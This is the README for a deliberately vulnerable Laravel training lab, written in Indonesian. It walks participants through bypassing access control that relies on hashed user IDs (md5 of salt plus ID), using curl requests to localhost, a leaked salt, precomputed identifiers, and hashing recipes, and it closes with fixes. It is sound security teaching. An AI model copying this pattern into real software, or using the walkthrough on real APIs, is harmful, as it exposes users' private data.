# Lab Keamanan Web — Branch 3: IDOR dengan ID di-Hash (Challenge)

> **PERINGATAN:** Aplikasi ini sengaja dibuat rentan untuk tujuan edukasi.
> Jangan pernah deploy ke internet publik dan jangan tiru polanya di produksi.

## Setup

```bash
composer install
npm install
php artisan key:generate
php artisan migrate --seed
npm run dev
php artisan serve
```

User demo (password semua: `password`): `attacker@example.com` (id 1),
`victim1@example.com` (id 2), `victim2@example.com` (id 3).

## Kerentanan

```
GET /api/profile/{identifier}        (butuh login)
```

URL **tidak pakai id angka**. `{identifier}` adalah id user yang di-hash pakai
`salt`. Kelihatannya aman — padahal IDOR tetap ada: siapa pun yang punya `salt`
(bocor di branch 2) bisa membuat identifier untuk id mana pun.

### Skema identifier (gampang, bisa di tool apa pun)

```
identifier = md5(salt + id)
```

Contoh: `md5("Y0uM16htN33dM3" + "2")` = `b6643c1ac1d31c8a4ddbb75b12ef692e`.

## Alur challenge (untuk peserta)

1. Coba akses dengan id angka biasa:
   ```bash
   curl -b "cookie_sesi" http://localhost:8000/api/profile/1
   ```
   Respons (422): `{"message":"kita butuh garam garam garam", ...}`
2. Dari branch 2, peserta sudah tahu `salt = Y0uM16htN33dM3`.
3. Peserta hash `salt + id` target → dapat identifier → akses:
   ```bash
   curl -b "cookie_sesi" http://localhost:8000/api/profile/b6643c1ac1d31c8a4ddbb75b12ef692e
   ```
   Data `victim1` keluar. IDOR berhasil lagi.

### Identifier siap pakai (salt default)

| id | user                 | identifier = md5(salt+id)            |
|----|----------------------|--------------------------------------|
| 1  | attacker@example.com | `3213b3a083711ad8ac5a6d7c61c1f0d2`   |
| 2  | victim1@example.com  | `b6643c1ac1d31c8a4ddbb75b12ef692e`   |
| 3  | victim2@example.com  | `24e09241d1d4f541b007238117c8f872`   |

### Tool untuk hitung identifier

- **CyberChef** (https://cyberchef.org, tanpa install): resep `MD5`, input `Y0uM16htN33dM32`.
- **Terminal:** `echo -n "Y0uM16htN33dM32" | md5sum` (Linux) / `md5 -s "Y0uM16htN33dM32"` (macOS).
- **PHP:** `md5('Y0uM16htN33dM3' . '2')`
- **Python:** `hashlib.md5(b'Y0uM16htN33dM32').hexdigest()`
- **JS:** pakai CryptoJS `CryptoJS.MD5('Y0uM16htN33dM32').toString()`

> Catatan: `md5(salt + id)` = gabung salt dan id jadi satu string lalu di-md5
> (tanpa spasi/pemisah). Server mencocokkan dengan cara meng-hash id tiap user.

## File yang relevan

- `app/Support/ProfileIdentifier.php` — `md5(salt + id)`
- `app/Http/Controllers/Api/EncryptedProfileController.php` — controller + hint
- `config/lab.php` — nilai `salt`
- `tests/Feature/SecurityLab/EncryptedProfileIdorTest.php`

## Perbaikan (yang seharusnya dilakukan)

- Hash/obfuscate id **bukan** kontrol akses. Tetap wajib otorisasi per-objek.
- Jangan pakai rahasia yang bisa bocor lewat API (seperti `salt` di sini).
- Jangan bocorkan hash password / token reset.
